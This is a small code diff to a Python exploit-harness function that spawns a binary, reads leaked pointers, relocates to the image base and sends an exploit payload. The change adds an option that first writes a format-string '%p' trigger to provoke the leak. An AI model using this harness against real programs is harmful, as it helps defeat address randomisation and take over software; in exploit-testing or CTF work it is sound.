@@ -30,7 +30,7 @@ def _kill(p):
 
 def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
                      payload_for_base, success_regex: str, timeout: float = 8.0,
-                     mem_mb: int = 2048, base_from_leaks=None) -> dict:
+                     mem_mb: int = 2048, base_from_leaks=None, leak_trigger: bytes = b"") -> dict:
     """Interactive single-process leak → relocate → exploit over stdin/stdout.
 
     Two ways to turn the leak into an image base:
@@ -57,6 +57,13 @@ def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
                              preexec_fn=preexec)
     except Exception as e:
         return {"ok": False, "reason": f"spawn failed: {e!r}"}
+
+    if leak_trigger:                             # a format-string leak must be PROVOKED: send the
+        try:                                     # %p dump first, then read the pointers it prints
+            p.stdin.write(leak_trigger)
+            p.stdin.flush()
+        except (BrokenPipeError, OSError):
+            pass
 
     def _vals(b):
         out = []
